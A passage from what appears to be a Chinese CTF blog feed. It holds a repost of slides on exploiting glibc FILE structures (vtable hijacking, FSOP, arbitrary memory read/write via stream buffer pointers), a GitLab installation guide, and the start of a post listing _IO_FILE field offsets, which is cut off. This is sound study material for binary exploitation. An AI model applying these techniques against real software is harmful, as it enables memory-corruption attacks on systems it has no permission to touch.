    <link href="/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/"/>
    <url>/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/</url>
    
    <content type="html"><![CDATA[<blockquote><p>搬运自<a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Angel Boy师傅的分享</a></p></blockquote><p><strong>多图预警</strong></p><h1 id="content"><a href="#content" class="headerlink" title="content"></a>content</h1><ul><li>introduction<ul><li>file stream</li><li>overwrite the file struction</li></ul></li><li>Exploiation of FILE struction<ul><li>FSOP</li><li>Vtable verfication in FILE  struction</li><li>Make file struction great again</li></ul></li><li>conclusion</li></ul><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><h2 id="what-happen-when-we-use-a-raw-io-function"><a href="#what-happen-when-we-use-a-raw-io-function" class="headerlink" title="what happen when we use a raw io function"></a>what happen when we use a raw io function</h2><p><img src="https://i.loli.net/2019/08/07/Wgu1PQtryD5Lhp7.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/07/E6IPFGurM1w98aD.png" alt="image.png"></p><h2 id="what-is-file-stream"><a href="#what-is-file-stream" class="headerlink" title="what is file stream?"></a>what is file stream?</h2><ul><li>A higher-level interface on the primitive file descriptor facilites</li><li>Stream buffering</li><li>Portable and High performance</li></ul><h2 id="what-is-FILE-structure"><a href="#what-is-FILE-structure" class="headerlink" title="what is FILE structure"></a>what is FILE structure</h2><ul><li>A file stream descripor</li><li>Created by fopen</li></ul><h2 id="what-happen-when-we-use-stdio-function"><a href="#what-happen-when-we-use-stdio-function" class="headerlink" title="what happen when we use stdio function"></a>what happen when we use stdio function</h2><p><img src="https://i.loli.net/2019/08/07/xjKJEV9PaF84Qui.png" alt="image.png"><br><img src="https://i.loli.net/2019/08/07/4sy1F2oGAUxW6ZD.png" alt="image.png"></p><h2 id="overwrite-the-file-struction"><a href="#overwrite-the-file-struction" class="headerlink" title="overwrite the file struction"></a>overwrite the file struction</h2><ul><li>File struction<ul><li>A complex struction<ul><li>Flags</li><li>Stream buffer</li><li>File descriptor</li></ul></li><li>FILE_PUTS<ul><li>virtul function table</li></ul></li></ul></li></ul><p>结构体在我之前的文章有写,师傅们可以看之前的文章即可</p><h3 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h3><ul><li>Record the attribute of the File stream</li><li>Read only</li><li>Append</li></ul><p><img src="https://i.loli.net/2019/08/07/O75gzbIBTGLK8Yl.png" alt="image.png"></p><h3 id="Stream-buffer"><a href="#Stream-buffer" class="headerlink" title="Stream buffer"></a>Stream buffer</h3><ul><li>Read buffer</li><li>Write buffer</li><li>Reserve buffer</li></ul><p><img src="https://i.loli.net/2019/08/07/32ZeYbLCdlJzjax.png" alt="image.png"></p><h3 id="fileno"><a href="#fileno" class="headerlink" title="_fileno"></a>_fileno</h3><ul><li>File descriptor</li><li>Return by sys_open<br><img src="https://i.loli.net/2019/08/07/bk1qERm2nGzaFNI.png" alt="image.png"></li></ul><h3 id="file-plus"><a href="#file-plus" class="headerlink" title="file_plus"></a>file_plus</h3><ul><li>stdin&#x2F;stdout&#x2F;stderr</li><li>fopen also use it</li><li>Extra Virtul function table<ul><li>Any operation on file is via vtable</li></ul></li></ul><p><img src="https://i.loli.net/2019/08/07/tU6yW5QRbPdKsNn.png" alt="image.png"><br><img src="https://i.loli.net/2019/08/07/t1KYJGDBiyMOQhf.png" alt="image.png"></p><h3 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h3><p>Every FILE associate with a _chain (linked  list)<br><img src="https://i.loli.net/2019/08/07/UyCLlYm2tPbQjpg.png" alt="image.png"></p><h2 id="fopen-workflow"><a href="#fopen-workflow" class="headerlink" title="fopen workflow"></a>fopen workflow</h2><ul><li>Allocate FILE Structure</li><li>initial the FILE structure<ul><li>Link the FILE structure</li></ul></li><li>open file</li></ul><p><img src="https://i.loli.net/2019/08/07/yxjl74P2MNkhSVD.png" alt="image.png"></p><h3 id="allocate-file-structure"><a href="#allocate-file-structure" class="headerlink" title="allocate file structure"></a>allocate file structure</h3><p><img src="https://i.loli.net/2019/08/07/u5Iy7XortxjRhYK.png" alt="image.png"></p><h3 id="initial-the-file-structure"><a href="#initial-the-file-structure" class="headerlink" title="initial the file structure"></a>initial the file structure</h3><p><img src="https://i.loli.net/2019/08/07/AvKskPraWXNJ3Cw.png" alt="image.png"></p><h3 id="Link-the-file-structure"><a href="#Link-the-file-structure" class="headerlink" title="Link the file structure"></a>Link the file structure</h3><p><img src="https://i.loli.net/2019/08/07/RBt8D1ZYbwxeJCE.png" alt="image.png"></p><h3 id="open-file"><a href="#open-file" class="headerlink" title="open file"></a>open file</h3><p><img src="https://i.loli.net/2019/08/07/53khYwPgHvEsZWx.png" alt="image.png"></p><h2 id="fread-workflow"><a href="#fread-workflow" class="headerlink" title="fread workflow"></a>fread workflow</h2><ul><li>IF stream buffer is NULL<ul><li>Allocate buffer</li></ul></li><li>Read data to the stream buffer</li><li>copy data from stream buffer to destination</li></ul><p><img src="https://i.loli.net/2019/08/07/1D9xyrliMAhOSj8.png" alt="image.png"></p><h3 id="If-stream-buffer-is-NULL"><a href="#If-stream-buffer-is-NULL" class="headerlink" title="If stream buffer is NULL"></a>If stream buffer is NULL</h3><p>allocate buffer</p><p><img src="https://i.loli.net/2019/08/07/kMBhoFKVpRijl92.png" alt="image.png"></p><h3 id="read-data-to-the-stream-buffer"><a href="#read-data-to-the-stream-buffer" class="headerlink" title="read data to the stream buffer"></a>read data to the stream buffer</h3><p><img src="https://i.loli.net/2019/08/07/UiAoXSF6rMnHfuN.png" alt="image.png"></p><h3 id="copy-data-from-stream-buffer-to-destination"><a href="#copy-data-from-stream-buffer-to-destination" class="headerlink" title="copy data from stream buffer to destination"></a>copy data from stream buffer to destination</h3><p><img src="https://i.loli.net/2019/08/07/9uls5ZRUtEHnVAX.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/07/7oUra8bXzAjHLOi.png" alt="image.png"></p><h3 id="if-the-stream-is-filled-or-flush-the-stream"><a href="#if-the-stream-is-filled-or-flush-the-stream" class="headerlink" title="if the stream is filled or flush the stream"></a>if the stream is filled or flush the stream</h3><ul><li>write data from stream buffer to the file</li></ul><p><img src="https://i.loli.net/2019/08/07/ujZDyNGsdBk6PIn.png" alt="image.png"></p><h2 id="fclose-workflow"><a href="#fclose-workflow" class="headerlink" title="fclose workflow"></a>fclose workflow</h2><ul><li>If stream buffer is NULL<ul><li>allocte buffer</li></ul></li><li>copy user data to the stream buffer </li><li>if the steram buffer if filled or flush the stream<ul><li>write data from stream buffer to the file</li></ul></li></ul><p><img src="https://i.loli.net/2019/08/07/pEnGT8V2ifCBzON.png" alt="image.png"></p><ul><li>unlink the file structure</li><li>flush &amp; realease the strean buffer</li><li>close the file</li><li>release the file structure</li></ul><p><img src="https://i.loli.net/2019/08/07/ZtecGMz2EKBkLQa.png" alt="image.png"></p><h1 id="Exploitation-of-FILE-structure"><a href="#Exploitation-of-FILE-structure" class="headerlink" title="Exploitation of FILE structure"></a>Exploitation of FILE structure</h1><p>There are a good target in FILE structure</p><p>Virtual function table</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">struct</span> _IO_FILE_plus<br>&#123;<br>    _IO_FILE <span class="hljs-keyword">file</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="let’s-overwrite-with-buffer-address"><a href="#let’s-overwrite-with-buffer-address" class="headerlink" title="let’s overwrite with buffer address"></a>let’s overwrite with buffer address</h2><p><img src="https://i.loli.net/2019/08/07/lGe673jmzYFWO8w.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/07/kKSwbXWsZFyI165.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/07/JVNY5PLUwKTjHRZ.png" alt="image.png"></p><h3 id="Not-call-vtable-directly"><a href="#Not-call-vtable-directly" class="headerlink" title="Not call vtable directly"></a>Not call vtable directly</h3><ul><li>RDX is our input but not call instruction</li></ul><p><img src="https://i.loli.net/2019/08/07/FV1G5i4pWrcIPk8.png" alt="image.png"></p><h3 id="Let’s-see-what-happened-in-fclose"><a href="#Let’s-see-what-happened-in-fclose" class="headerlink" title="Let’s see what happened in fclose"></a>Let’s see what happened in fclose</h3><ul><li>we can get information of segfault in gdb and located it in source code</li></ul><p><img src="https://i.loli.net/2019/08/07/lUTnZMRCksQ8VGh.png" alt="image.png"></p><h2 id="File-structure"><a href="#File-structure" class="headerlink" title="File structure"></a>File structure</h2><ul><li>_lock</li><li>prevent race condition in multithread</li><li>Very common in stdio related function</li><li>Usually need to construct it for Exploitaion</li></ul><p><img src="https://i.loli.net/2019/08/07/9c6X5mUiuENepBD.png" alt="image.png"></p><h2 id="Let’s-fix-the-lock"><a href="#Let’s-fix-the-lock" class="headerlink" title="Let’s fix the lock"></a>Let’s fix the lock</h2><p><img src="https://i.loli.net/2019/08/09/8ok7EwOfJN245lg.png" alt="image.png"></p><h2 id="we-control-PC"><a href="#we-control-PC" class="headerlink" title="we control PC"></a>we control PC</h2><p><img src="https://i.loli.net/2019/08/09/nXIPZNF4MzR6uGl.png" alt="image.png"></p><h2 id="Another-interesting"><a href="#Another-interesting" class="headerlink" title="Another interesting"></a>Another interesting</h2><ul><li>stdin&#x2F;stdout&#x2F;stderr is also a FILE struct in glibc</li><li>We can overwrite the global variable in glibc varible in glibc to control the flow</li></ul><p><img src="https://i.loli.net/2019/08/09/kdny7QpgD4P6xXI.png" alt="image.png"></p><h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><ul><li>File-Stream Oriented Programing <ul><li>Control the linked list of File stream <ul><li>_chain </li><li>_IO_list_all</li></ul></li><li>Powerful function <ul><li>_IO_ﬂush_all_lockp</li></ul></li></ul></li></ul><h2 id="IO-ﬂush-all-lockp"><a href="#IO-ﬂush-all-lockp" class="headerlink" title="_IO_ﬂush_all_lockp"></a>_IO_ﬂush_all_lockp</h2><ul><li>flush all file stream</li></ul><h3 id="We-can-call-it"><a href="#We-can-call-it" class="headerlink" title="We can call it"></a>We can call it</h3><ul><li>glibc abort routine</li><li>exit function</li><li>Main return</li></ul><p><img src="https://i.loli.net/2019/08/09/93OQdt7aJiBPIjp.png" alt="image.png"></p><ul><li>It will process all FILE in FILE linked list </li><li>We can construct the linked list to do oriented programing</li></ul><p><img src="https://i.loli.net/2019/08/09/sUuC5cmb4ISfGwy.png" alt="image.png"></p><h2 id="FILE-stream-oriented-programing"><a href="#FILE-stream-oriented-programing" class="headerlink" title="FILE-stream oriented programing"></a>FILE-stream oriented programing</h2><p><img src="https://i.loli.net/2019/08/09/kGxe5zBsM1WrtZD.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/09/YbSMlH3whjtdUfn.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/09/VjUcAIbMvC7rhi1.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/09/YRzkZwgjHDcNnGq.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/09/2DnsHeMBrxUyK8i.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/08/09/aqiNzluRvOKrIfg.png" alt="image.png"></p><p>The we will ge shell!</p><h1 id="Vtable-verfication-in-FILE-structure"><a href="#Vtable-verfication-in-FILE-structure" class="headerlink" title="Vtable verfication in FILE structure"></a>Vtable verfication in FILE structure</h1><ul><li>Unfortunately, there are a virtual function table in latest libc </li><li>Check the address of vtable before all virtual function call </li><li>If vtable is invalid, it would abort</li></ul><h2 id="Vtable-veriﬁcation"><a href="#Vtable-veriﬁcation" class="headerlink" title="Vtable veriﬁcation"></a>Vtable veriﬁcation</h2><ul><li>Vtable veriﬁcation in File</li><li>The vtable must be in libc _IO_vtable section</li><li>If it’s not in _IO_vtable section, it will check if the vtable are permitted</li></ul><p><img src="https://i.loli.net/2019/08/09/wbptVNGjaOqIQxY.png" alt="image.png"></p><h2 id="IO-vtable-check"><a href="#IO-vtable-check" class="headerlink" title="_IO_vtable_check"></a>_IO_vtable_check</h2><ul><li>Check the foreign vtables Vtable veriﬁcation<br><img src="https://i.loli.net/2019/08/09/82D6kyg7JljaYHV.png" alt="image.png"></li></ul><h2 id="BPASS"><a href="#BPASS" class="headerlink" title="BPASS"></a>BPASS</h2><ul><li>Overwrite IO_accept_foreign_vtables ?</li><li>It’s very diﬃcult because of the pointer guard</li></ul><p><img src="https://i.loli.net/2019/08/09/84nHBUZ63qbIwO2.png" alt="image.png"></p><ul><li>Overwrite _dl_open_hook ?</li><li>Sounds good, but if you can control the value, you can also control other good target</li></ul><p><img src="https://i.loli.net/2019/08/09/pcnE3VIjNQTJP6b.png" alt="image.png"></p><h2 id="Summary-of-the-vtable-veriﬁcation"><a href="#Summary-of-the-vtable-veriﬁcation" class="headerlink" title="Summary of the vtable veriﬁcation"></a>Summary of the vtable veriﬁcation</h2><ul><li>It very hard to bypass it</li><li>Exploitation of FILE structure is died ?</li></ul><h1 id="Make-file-structure-greate-again"><a href="#Make-file-structure-greate-again" class="headerlink" title="Make file structure greate again"></a>Make file structure greate again</h1><h2 id="how-about-change-the-target-from-vtable-to-other-element"><a href="#how-about-change-the-target-from-vtable-to-other-element" class="headerlink" title="how about change  the target from vtable to other element"></a>how about change  the target from vtable to other element</h2><ul><li>stream buffer &amp; File Descripor</li></ul><p><img src="https://i.loli.net/2019/08/09/EDWH5YKoTS81jXy.png" alt="image.png"></p><ul><li>If we can overwrite the FILE structure and use fread and fwrite with the FILE structure</li><li>We can <ul><li>Arbitrary memory reading </li><li>Arbitrary memory writing</li></ul></li></ul><h3 id="Arbitrary-memory-reading"><a href="#Arbitrary-memory-reading" class="headerlink" title="Arbitrary memory reading"></a>Arbitrary memory reading</h3><ul><li>fwrite<ul><li>Set the _ﬁleno to the ﬁle descriptor of stdout</li><li>Set _ﬂag &amp; ~_IO_NO_WRITES</li><li>Set _ﬂag |&#x3D; _IO_CURRENTLY_PUTTING </li><li>Set the write_base &amp; write_ptr to memory address which you want to read</li><li>_IO_read_end equal to _IO_write_base<br>其中:</li></ul></li><li>Set _ﬂag &amp;~ _IO_NO_WRITES</li><li>Set _ﬂag |&#x3D; _IO_CURRENTLY_PUTTING</li></ul><p><img src="https://i.loli.net/2019/08/09/YbDm4TfQgrLP7Be.png" alt="image.png"></p><ul><li>Let _IO_read_end equal to _IO_write_base</li><li>If it’s not, it would adjust to the current oﬀset</li></ul><p><img src="https://i.loli.net/2019/08/09/jJownXfGrQuUYI2.png" alt="image.png"></p><p><strong>sample code</strong> </p><p><img src="https://i.loli.net/2019/08/09/zwK1u2Q6VGosIl7.png" alt="image.png"></p><ul><li>fread<ul><li>Set the _ﬁleno to ﬁle descriptor of stdin</li><li>Set _ﬂag &amp;~ _IO_NO_READS</li><li>Set read_base &amp; read_ptr to NULL</li><li>Set the buf_base &amp; buf_end to memory address which you want to wirte</li><li>buf_end - buf_base &lt; size of fread</li></ul></li></ul><p>其中:</p><ul><li>Set read_base &amp; read_ptr to NULL<br><img src="https://i.loli.net/2019/08/09/PhzIgQN6ERDcoGq.png" alt="image.png"></li><li>Set _ﬂag &amp;~ _IO_NO_READS<br><img src="https://puui.qpic.cn/fans_admin/0/3_155518641_1565412684323/0" alt="image.png"></li></ul><p><strong>sample code</strong><br><img src="https://puui.qpic.cn/fans_admin/0/3_1565779192_1565412774359/0" alt="ima.png"></p><ul><li><p>If you have arbitrary memory address read and write, you can control the ﬂow very easy</p><ul><li>GOT hijack</li><li>_<em>malloc_hook</em>&#x2F;_<em>free_hook</em>&#x2F;_<em>realloc_hook</em></li><li>…</li></ul></li><li><p>By the way, you can not only use fread and fwrite but also use any stdio related function</p></li><li><p>If we don’t have any ﬁle operation in the program,We can use:</p><ul><li>stdin&#x2F;stdout&#x2F;stderr</li><li>put&#x2F;printf&#x2F;scanf</li><li>…</li></ul></li><li><p>Scenario</p><ul><li>use any stdin related  function <ul><li>scanf&#x2F;fgets&#x2F;gets</li></ul></li><li>Stdin in unbuffer<ul><li>very  common in normal stdio program</li></ul></li></ul></li></ul><p><img src="https://puui.qpic.cn/fans_admin/0/3_1757851795_1565413454773/0" alt="i.png"></p><ul><li>Overwrite buf_end with a pointer behind the stdin<ul><li>Unsorted bin attack</li><li>Very common in heap exploitation</li></ul></li></ul><p><img src="https://puui.qpic.cn/fans_admin/0/3_1757851795_1565413538597/0" alt="i.png"></p><p><img src="https://puui.qpic.cn/fans_admin/0/3_1565779192_1565413567143/0" alt="q.png"></p><ul><li>stdin relatedd function<ul><li>scanf(“%d”,&amp;var)<ul><li>It will call<ul><li>read(0,buf_base,sizeof(stdin buffer))</li></ul></li></ul></li></ul></li></ul><p><img src="https://puui.qpic.cn/fans_admin/0/3_155518641_1565413709350/0" alt="r.png">  </p><ul><li>It can overwrite many global variable in glibc </li><li>Input :aaa…</li></ul><p><img src="https://puui.qpic.cn/fans_admin/0/3_1757851795_1565413798496/0" alt="q.png"></p><p><strong>Control The PC</strong></p><ul><li>How about Windows ?<ul><li>No vtable in FILE</li><li>It also has stream buﬀer pointer <ul><li>You can corrupt it to achieve arbitrary memory read and write</li></ul></li></ul></li></ul><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul><li><p>FILE structure is a good target for binary exploit </p><ul><li>It can be used to <ul><li>Arbitrary memory read and write </li><li>Control the PC and do oriented programing </li><li>Other exploit technology </li><li>Arbitrary free&#x2F;unmmap</li></ul></li><li>It’s very powerful in some unexploitable case</li><li>Let’s try to ﬁnd more and more exploit technology in FILE structure!</li></ul><p>  over~</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>&#39;gitlab踩坑&#39;</title>
    <link href="/2019/08/06/gitlab%E8%B8%A9%E5%9D%91/"/>
    <url>/2019/08/06/gitlab%E8%B8%A9%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>因为某些需要抛弃了github…好吧是因为私人项目人数 &lt; 3 ,于是拥抱了gitlab,安装过程中踩坑良久,这里做以记录</p></blockquote><h1 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h1><p>阿里云服务器学生机<br>centos7</p><h1 id="0x01-添加依赖"><a href="#0x01-添加依赖" class="headerlink" title="0x01 添加依赖"></a>0x01 添加依赖</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> yum install curl policycoreutils openssh-server openssh-clients<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> sshd<br><span class="hljs-built_in">sudo</span> systemctl start sshd<br><span class="hljs-built_in">sudo</span> yum install postfix<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> postfix<br><span class="hljs-built_in">sudo</span> systemctl start postfix<br>systemctl start firewalld.service<br><span class="hljs-built_in">sudo</span> firewall-cmd --permanent --add-service=http<br></code></pre></td></tr></table></figure><h1 id="0x02-下载gitlab包"><a href="#0x02-下载gitlab包" class="headerlink" title="0x02 下载gitlab包"></a>0x02 下载gitlab包</h1><p>可以在<a href="https://packages.gitlab.com/gitlab/gitlab-ce">这里</a>选择想要的版本<br>然后我这里直接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/el/<span class="hljs-number">7</span>/gitlab-ce-<span class="hljs-number">12</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>-ce.<span class="hljs-number">0</span>.el7.x86_64.rpm/download.rpm<br></code></pre></td></tr></table></figure><p>下下来之后解包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpm</span> -i gitlab-ce-<span class="hljs-number">12</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>-ce.<span class="hljs-number">0</span>.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><h1 id="0x03-配置"><a href="#0x03-配置" class="headerlink" title="0x03 配置"></a>0x03 配置</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">打开配置文件<br>vim /etc/gitlab/gitlab<span class="hljs-selector-class">.rb</span><br>然后把external_url <span class="hljs-string">&#x27;http://xxxxxx&#x27;</span>改成自己的<br>如果需要更改端口请顺便更改<br>unicorn<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;port&#x27;</span>]</span> 为你想要使用的且未被占用的端口<br></code></pre></td></tr></table></figure><h1 id="0x4-启动"><a href="#0x4-启动" class="headerlink" title="0x4 启动"></a>0x4 启动</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> gitlab-ctl reconfigure<br><span class="hljs-built_in">sudo</span> gitlab-ctl start<br></code></pre></td></tr></table></figure><h1 id="0x05-填坑"><a href="#0x05-填坑" class="headerlink" title="0x05 填坑"></a>0x05 填坑</h1><p>访问之后发现一直502,网上的解决办法基本是:</p><ol><li>更改端口(端口被占用)</li><li>关一些不必要的服务(内存不足)</li><li>更改连接超时时间如</li></ol><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">gitlab_rails[<span class="hljs-string">&#x27;webhook_timeout&#x27;</span>] = <span class="hljs-number">90</span> <br>gitlab_rails[<span class="hljs-string">&#x27;git_timeout&#x27;</span>]=<span class="hljs-number">90</span><br></code></pre></td></tr></table></figure><p>但这些对我来说都没用..疯狂刷新无果后..最后找到了解决办法<br>确实是我内存爆了..QAQ<br>下面开启swap即可</p><ul><li>创建大小为4GB</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/zero <span class="hljs-attribute">of</span>=/mnt/swap <span class="hljs-attribute">bs</span>=1M <span class="hljs-attribute">count</span>=4096<br></code></pre></td></tr></table></figure><ul><li>设置交换分区文件</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">mkswap /mnt/<span class="hljs-keyword">swap</span><br></code></pre></td></tr></table></figure><ul><li>立即启用交换分区文件</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">swapon /mnt/<span class="hljs-keyword">swap</span><br><br></code></pre></td></tr></table></figure><ul><li>设置权限</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 0600 /mnt/swap<br></code></pre></td></tr></table></figure><ul><li>开机自启</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/mnt/swap swap swap defaults 0 0&#x27;</span> &gt;&gt; /etc/fstab<br></code></pre></td></tr></table></figure><ul><li>永久修改 swpapiness 参数</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">10</span> &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/vm/</span>swappiness<br>sed -i <span class="hljs-string">&#x27;s|vm.swappiness=0|vm.swappiness=10|&#x27;</span> <span class="hljs-regexp">/etc/</span>sysctl.conf <br></code></pre></td></tr></table></figure><p> ok</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>_IO_FILE结构体利用</title>
    <link href="/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/"/>
    <url>/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>good good study,day day up~</p></blockquote><h1 id="翻阅的师傅们的文章"><a href="#翻阅的师傅们的文章" class="headerlink" title="翻阅的师傅们的文章"></a>翻阅的师傅们的文章</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/i</span>o_file<span class="hljs-regexp">/fake-vtable-exploit-zh/</span><span class="hljs-comment">#2018-hctf-the_end</span><br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">164558</span><span class="hljs-comment">#h3-3</span><br>https:<span class="hljs-regexp">//</span>firmianay.gitbooks.io<span class="hljs-regexp">/ctf-all-in-one/</span>doc/<span class="hljs-number">4.13</span>_io_file.html<br></code></pre></td></tr></table></figure><h1 id="File结构"><a href="#File结构" class="headerlink" title="File结构"></a>File结构</h1><p>日常使用中setvbuf，stdin、stdout、stderr四个结构体一般位于libc数据段,其他的保存在栈上</p><h1 id="构造偏移"><a href="#构造偏移" class="headerlink" title="构造偏移"></a>构造偏移</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">0</span>x0   <span class="hljs-variable">_flags</span><br><span class="hljs-number">0</span>x8   <span class="hljs-variable">_IO_read_ptr</span><br><span class="hljs-number">0</span>x10  <span class="hljs-variable">_IO_read_end</span><br><span class="hljs-number">0</span>x18  <span class="hljs-variable">_IO_read_base</span><br><span class="hljs-number">0</span>x20  <span class="hljs-variable">_IO_write_base</span><br><span class="hljs-number">0</span>x28  <span class="hljs-variable">_IO_write_ptr</span><br><span class="hljs-number">0</span>x30  <span class="hljs-variable">_IO_write_end</span><br><span class="hljs-number">0</span>x38  <span class="hljs-variable">_IO_buf_base</span><br><span class="hljs-number">0</span>x40  <span class="hljs-variable">_IO_buf_end</span><br><span class="hljs-number">0</span>x48  <span class="hljs-variable">_IO_save_base</span><br><span class="hljs-number">0</span>x50  <span class="hljs-variable">_IO_backup_base</span><br><span class="hljs-number">0</span>x58  <span class="hljs-variable">_IO_save_end</span><br><span class="hljs-number">0</span>x60  <span class="hljs-variable">_markers</span><br><span class="hljs-number">0</span>x68  <span class="hljs-variable">_chain</span><br><span class="hljs-number">0</span>x70  <span class="hljs-variable">_fileno</span><br><span class="hljs-number">0</span>x74  <span class="hljs-variable">_flags2</span><br><span class="hljs-number">0</span>x78  <span class="hljs-variable">_old_offset</span><br><span class="hljs-number">0</span>x80  <span class="hljs-variable">_cur_column</span><br><span class="hljs-number">0</span>x82  <span class="hljs-variable">_vtable_offset</span><br><span class="hljs-number">0</span>x83  <span class="hljs-variable">_shortbuf</span><br><span class="hljs-number">0</span>x88  <span class="hljs-variable">_lock</span><br><span class="hljs-number">0</span>x90  <span class="hljs-variable">_offset</span><br><span class="hljs-number">0</span>x98  <span class="hljs-variable">_codecvt</span><br><span class="hljs-number">0</span>xa0  <span class="hljs-variable">_wide_data</span><br><span class="hljs-number">0</span>xa8  <span class="hljs-variable">_freeres_list</span><br><span class="hljs-number">0</span>xb0  <span class="hljs-variable">_freeres_buf</span><br><span class="hljs-number">0</span>xb8  <span class="hljs-variable">__pad5</span><br><span class="hljs-number">0</span>xc0  <span class="hljs-variable">_mode</span><br><span class="hljs-number">0</span>xc4  <span class="hljs-variable">_unused2</span><br><span class="hljs-number">0</span>xd8  vtable<br></code></pre></td></tr></table></figure><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 